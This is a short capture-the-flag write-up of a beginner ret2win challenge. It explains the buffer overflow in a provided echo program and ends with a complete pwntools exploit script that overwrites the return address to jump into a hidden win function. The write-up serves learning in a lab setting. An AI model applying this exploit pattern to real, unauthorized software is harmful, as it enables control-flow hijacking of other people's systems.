## Kuiper Belt Relay Core
* Author&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : CSSCTF
* Point&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 15
* Difficulity&nbsp;&nbsp;&nbsp;&nbsp; : Beginner
* Solved By&nbsp;&nbsp;&nbsp;&nbsp;: Eclair
---

#### Description
*The Relay rebooted an old diagnostic process - it just
echoes back whatever you send it. Simple by design.*
<br>
*But it's still carrying dead code from before the blackout:
a function that's never called, sitting untouched in
memory. Redirect the program into it.*

#### Analysis
Interesting challenge, we only got the source code `echo.c`. Immediately checking the source code.<br>
<br>
<img width="840" height="811" alt="image" src="https://github.com/user-attachments/assets/9b79f858-4aa6-4d53-a141-28cc4ad4de54" /><br>
<br>
From the photo, we can take the conclusion immediately, the vulnerability is `buffer overflow` and the method is `ret2win`, since we have `win()` function.<br>
But, here's the actual problem.<br>
We don't have `ELF` file, that's a bad news, it mean we don't know what protection they have, is it a problem? OF COURSE, what if there is `stack canaries` or what if it has `PIE` protection, that's a huge problem.<br>
put that aside, the another huge problem is we don't know what distro they use, the version, the compiler version, it will make the environment is significantly different.<br>

> **DISCLAIMER**<br>
> *The fact when I work on this challenge, it's a bit luck, you know what, I use Ubuntu:24.04 and GCC:13.3.0*

Because we don't have `ELF` file, I compile the source code by myself, with no protection and 64-bit.<br>
And then, just like common `ret2win`, I got the flag.<br>

#### Exploit
Here's my full exploit.<br>
<br>
```python
from pwn import *

elf = context.binary = ELF('./echo')
io = process('./echo')
#io = remote('34.116.80.78', 9998)
rop = ROP(elf)

win_addr = elf.sym['win']
ret_addr = rop.find_gadget(['ret'])[0]
offset = 0x48

payload = b'a' * 0x48
payload += p64(ret_addr)
payload += p64(win_addr)

io.sendline(payload)
io.interactive()
```
<br>
That's it
